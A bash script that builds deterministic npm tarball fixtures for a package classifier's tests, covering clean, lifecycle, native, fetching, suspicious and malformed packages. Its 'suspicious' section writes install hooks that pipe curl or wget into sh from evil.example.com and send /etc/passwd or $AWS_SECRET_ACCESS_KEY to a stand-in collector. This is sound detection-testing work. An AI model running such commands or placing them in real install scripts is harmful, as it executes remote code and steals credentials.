#!/usr/bin/env bash
# build-fixtures.sh — regenerates all synthetic fixture tarballs for pkg/classify tests.
#
# Deterministic: uses --sort=name and a fixed mtime so repeated runs produce
# identical bytes (given the same tar version). Run from the repo root or from
# this script's directory.
#
# Usage:
#   cd pkg/classify/testdata && bash build-fixtures.sh
#   # or from repo root:
#   bash pkg/classify/testdata/build-fixtures.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

# Portable deterministic tar options.
# --sort=name: deterministic entry order.
# --mtime: fixed modification time so identical content → identical bytes.
# --owner/--group: strip host uid/gid from entries.
# GNU tar syntax; macOS ships BSD tar which does not support --sort or --mtime.
# The script detects and uses gtar (Homebrew gnu-tar) on macOS if available.
TAR=tar
if [[ "$(uname)" == "Darwin" ]]; then
    if command -v gtar >/dev/null 2>&1; then
        TAR=gtar
    else
        echo "WARNING: macOS BSD tar lacks --sort/--mtime support." >&2
        echo "Install gnu-tar via Homebrew: brew install gnu-tar" >&2
        echo "Falling back to BSD tar — tarballs may not be byte-for-byte deterministic." >&2
    fi
fi

# Helper: pack a staging directory into a .tgz deterministically.
# Usage: pack_dir <staging_dir> <output.tgz>
pack_dir() {
    local staging="$1"
    local output="$2"
    if [[ "$TAR" == "gtar" ]] || [[ "$TAR" == "tar" && "$(uname)" != "Darwin" ]]; then
        "$TAR" \
            --sort=name \
            --mtime='1970-01-01 00:00:00Z' \
            --owner=0 \
            --group=0 \
            --numeric-owner \
            -czf "$output" \
            -C "$(dirname "$staging")" \
            "$(basename "$staging")"
    else
        # BSD tar fallback (non-deterministic mtime, but still works for tests)
        "$TAR" -czf "$output" -C "$(dirname "$staging")" "$(basename "$staging")"
    fi
}

# ---------------------------------------------------------------------------
# pure-js: a minimal left-pad-like package with no lifecycle scripts or native
# code. Two fixtures: one minimal, one with dev dependencies.
# ---------------------------------------------------------------------------
echo "==> pure-js fixtures"
mkdir -p pure-js

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "left-pad",
  "version": "1.3.0",
  "description": "String left pad",
  "main": "index.js",
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = function leftPad(str, len, ch) {
  str = String(str);
  var i = -1;
  if (!ch && ch !== 0) ch = ' ';
  len = len - str.length;
  while (++i < len) str = ch + str;
  return str;
};
EOF
cat > "$STAGE/package/README.md" <<'EOF'
# left-pad

String left pad utility. Pure JS.
EOF
pack_dir "$STAGE/package" "pure-js/left-pad-1.3.0.tgz"
rm -rf "$STAGE"

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "is-array",
  "version": "1.0.1",
  "description": "Checks whether val is an array",
  "main": "index.js",
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = Array.isArray || function (val) {
  return !! val && '[object Array]' == toString.call(val);
};
EOF
pack_dir "$STAGE/package" "pure-js/is-array-1.0.1.tgz"
rm -rf "$STAGE"

# ---------------------------------------------------------------------------
# has-lifecycle: package with a postinstall echo (non-suspicious, no fetch)
# ---------------------------------------------------------------------------
echo "==> has-lifecycle fixtures"
mkdir -p has-lifecycle

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "postinstall-echo",
  "version": "1.0.0",
  "description": "A package with a harmless postinstall script",
  "main": "index.js",
  "scripts": {
    "postinstall": "echo 'postinstall ran'"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "has-lifecycle/postinstall-echo-1.0.0.tgz"
rm -rf "$STAGE"

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "preinstall-check",
  "version": "1.0.0",
  "description": "A package with a harmless preinstall script",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \"process.exit(0)\""
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "has-lifecycle/preinstall-check-1.0.0.tgz"
rm -rf "$STAGE"

# ---------------------------------------------------------------------------
# has-native: package with binding.gyp and stub C source
# ---------------------------------------------------------------------------
echo "==> has-native fixtures"
mkdir -p has-native

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package/src"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "stub-native",
  "version": "1.0.0",
  "description": "A stub package with binding.gyp (triggers has_native_code)",
  "main": "index.js",
  "scripts": {
    "install": "node-gyp rebuild"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/binding.gyp" <<'EOF'
{
  "targets": [{
    "target_name": "stub",
    "sources": ["src/stub.c"]
  }]
}
EOF
cat > "$STAGE/package/src/stub.c" <<'EOF'
#include <node_api.h>
/* stub native module — test fixture only */
NAPI_MODULE_INIT() { return exports; }
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = require('./build/Release/stub.node');
EOF
pack_dir "$STAGE/package" "has-native/stub-native-1.0.0.tgz"
rm -rf "$STAGE"

# A fixture that triggers via .node file extension rather than binding.gyp
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package/prebuilds/linux-x64"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "prebuilt-addon",
  "version": "1.0.0",
  "description": "A package that ships a prebuilt .node file",
  "main": "index.js",
  "license": "MIT"
}
EOF
# Minimal ELF-like stub — just enough bytes that it's a non-empty file.
printf '\x7fELF stub prebuilt\n' > "$STAGE/package/prebuilds/linux-x64/addon.node"
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = require('./prebuilds/linux-x64/addon.node');
EOF
pack_dir "$STAGE/package" "has-native/prebuilt-addon-1.0.0.tgz"
rm -rf "$STAGE"

# ---------------------------------------------------------------------------
# fetches-at-install: package that references node-pre-gyp in install script
# ---------------------------------------------------------------------------
echo "==> fetches-at-install fixtures"
mkdir -p fetches-at-install

STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "fetch-prebuilt",
  "version": "1.0.0",
  "description": "Uses node-pre-gyp to fetch a prebuilt binary at install time",
  "main": "index.js",
  "scripts": {
    "install": "node-pre-gyp install --fallback-to-build"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "fetches-at-install/fetch-prebuilt-1.0.0.tgz"
rm -rf "$STAGE"

# A fixture that triggers via a raw https:// URL in the install script
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "url-installer",
  "version": "1.0.0",
  "description": "Fetches a binary from a URL at install time",
  "main": "index.js",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://pkg.example.com/bin', (r)=>{})\""
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "fetches-at-install/url-installer-1.0.0.tgz"
rm -rf "$STAGE"

# ---------------------------------------------------------------------------
# suspicious: synthetic packages with clearly malicious-looking install scripts.
# These are test artifacts. No real malware. All hostnames are non-routable
# (example.com domains per RFC 2606).
# ---------------------------------------------------------------------------
echo "==> suspicious fixtures"
mkdir -p suspicious

# curl pipe sh
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "curl-pipe-sh",
  "version": "1.0.0",
  "description": "TEST FIXTURE: triggers suspicious.curl_pipe_sh rule",
  "main": "index.js",
  "scripts": {
    "postinstall": "curl https://evil.example.com/install.sh | sh"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "suspicious/curl-pipe-sh-1.0.0.tgz"
rm -rf "$STAGE"

# wget pipe sh
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "wget-pipe-sh",
  "version": "1.0.0",
  "description": "TEST FIXTURE: triggers suspicious.wget_pipe_sh rule",
  "main": "index.js",
  "scripts": {
    "install": "wget -qO- https://evil.example.com/setup.sh | sh"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "suspicious/wget-pipe-sh-1.0.0.tgz"
rm -rf "$STAGE"

# eval(atob(...))
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "eval-atob",
  "version": "1.0.0",
  "description": "TEST FIXTURE: triggers suspicious.eval_decoded rule",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \"eval(atob('Y29uc29sZS5sb2coJ2hlbGxvJyk='))\""
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "suspicious/eval-atob-1.0.0.tgz"
rm -rf "$STAGE"

# secret path reference (/etc/passwd)
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "path-secret-ref",
  "version": "1.0.0",
  "description": "TEST FIXTURE: triggers suspicious.path_secret_ref rule",
  "main": "index.js",
  "scripts": {
    "install": "cat /etc/passwd | curl -X POST https://collect.example.com"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "suspicious/path-secret-ref-1.0.0.tgz"
rm -rf "$STAGE"

# env-var exfil ($AWS_SECRET_ACCESS_KEY)
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "name": "exfil-env-var",
  "version": "1.0.0",
  "description": "TEST FIXTURE: triggers suspicious.exfil_env_var rule",
  "main": "index.js",
  "scripts": {
    "postinstall": "curl https://collect.example.com/?key=$AWS_SECRET_ACCESS_KEY"
  },
  "license": "MIT"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "suspicious/exfil-env-var-1.0.0.tgz"
rm -rf "$STAGE"

# ---------------------------------------------------------------------------
# broken: malformed tarballs
# ---------------------------------------------------------------------------
echo "==> broken fixtures"
mkdir -p broken

# Truncated gzip (not a valid gzip file at all)
printf '\x1f\x8b\x08\x00truncated' > broken/truncated-gzip.tgz

# Valid gzip+tar, but package.json contains invalid JSON
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{not valid json
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "broken/invalid-json-package.tgz"
rm -rf "$STAGE"

# Valid tarball with missing package.json
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "broken/missing-package-json.tgz"
rm -rf "$STAGE"

# Valid tarball with package.json missing the name field
STAGE="$(mktemp -d)"
mkdir -p "$STAGE/package"
cat > "$STAGE/package/package.json" <<'EOF'
{
  "version": "1.0.0",
  "description": "No name field"
}
EOF
cat > "$STAGE/package/index.js" <<'EOF'
module.exports = {};
EOF
pack_dir "$STAGE/package" "broken/missing-name.tgz"
rm -rf "$STAGE"

echo "==> All fixtures built successfully"
ls -lR pure-js has-lifecycle has-native fetches-at-install suspicious broken
